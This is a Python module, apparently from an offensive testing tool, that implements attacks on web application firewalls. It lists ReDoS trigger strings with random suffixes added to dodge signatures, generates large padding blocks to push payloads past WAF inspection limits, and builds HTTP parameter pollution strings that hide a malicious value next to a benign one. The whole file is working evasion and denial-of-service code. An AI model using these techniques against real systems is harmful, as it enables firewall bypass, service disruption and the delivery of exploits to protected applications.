"""
WAF Attacker Module

Implements direct attacks against WAF infrastructure:
1. ReDoS (Regular Expression Denial of Service) to trigger Fail-Open states.
2. Padding / Buffer Exhaustion to push payloads past inspection limits.
3. Parser Confusion (HPP, WAFFLED).
"""

import random
import string


class WafAttacker:
    def __init__(self):
        # Known evil regex triggers
        self.redos_payloads = [
            # Nested quantifiers causing catastrophic backtracking
            "((a+)+)+$",
            "(a+)+b",
            "([a-zA-Z]+)*$",
            "(.*a){10}x",
            "^(([a-z])+.)+[A-Z]([a-z])+$",
            # Large repetitive strings designed to hang regex engines
            "a" * 50000 + "X",
            "{" * 10000 + "}" * 10000
        ]

    def generate_redos_payload(self) -> str:
        """Returns a string designed to trigger catastrophic backtracking in WAF regex engines."""
        base = random.choice(self.redos_payloads)
        # Add random suffix to bypass simple signature matching of the ReDoS
        # payload itself
        suffix = "".join(random.choices(string.ascii_letters, k=8))
        return f"{base}_{suffix}"

    def generate_padding(self, size_kb: int = 128) -> str:
        """Generates a large block of benign data to exhaust WAF inspection buffers.
        Often WAFs only inspect the first 8KB-128KB of a request.
        """
        # We use standard JSON-safe padding so it doesn't break the actual application parser
        # format: "padding":"AAAA...AAA"
        chunk_size = size_kb * 1024
        # Use a mix of alphanumeric to look slightly more legitimate than just
        # 'A's
        chars = string.ascii_letters + string.digits
        padding = "".join(random.choices(chars, k=chunk_size))
        return padding

    def generate_hpp_params(
            self, param_name: str, malicious_value: str, benign_value: str = "1") -> str:
        """Generates HTTP Parameter Pollution string.
        Some WAFs check the first parameter, while the backend takes the last (or vice-versa).
        """
        # Formats: ?id=1&id=exploit OR ?id=exploit&id=1
        return f"{param_name}={benign_value}&{param_name}={malicious_value}"
